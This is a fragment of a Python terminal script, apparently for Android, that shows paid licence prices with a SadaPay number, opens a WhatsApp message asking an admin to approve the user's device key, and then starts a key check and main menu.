    print(G + "│ " + W + "SADAPAY   : " + C + "03060725589".ljust(34) + G + "│")

    print(G + "├───────────────────────────────────────────────┤" + X)

    print(G + "│ " + W + "3 DAYS   : " + Y + "150 PKR".ljust(35) + G + "│")

    print(G + "│ " + W + "7 DAYS   : " + Y + "300 PKR".ljust(35) + G + "│")

    print(G + "│ " + W + "30 DAYS  : " + Y + "500 PKR".ljust(35) + G + "│")

    print(G + "└───────────────────────────────────────────────┘" + X)

    print()

    # ================= CONTACT =================

    input(P + "[>] PRESS ENTER TO CONTACT ADMIN " + X)

    msg = (
        f"Assalam O Alaikum Shani Bhai,%0A%0A"
        f"My Device Key Is : {key}%0A%0A"
        f"Please Approve My Key."
    )

    os.system(
        f'am start -a android.intent.action.VIEW '
        f'-d "https://wa.me/923200795589?text={msg}"'
    )


# ─────────────────────────────
# 🚀 START
# ─────────────────────────────

try:

    boot_screen()

    key = get_device_key()

    user_key = key

    status, exp, left = check_key(key)

    globals()['exp'] = exp
    globals()['left'] = left

    # OPEN MAIN MENU
    BNG_71_()

except requests.exceptions.ConnectionError:

    print("\033[1;91m✖ NO INTERNET CONNECTION\033[0m")

except Exception as e:

    print("\033[1;91mERROR:\033[0m", e)
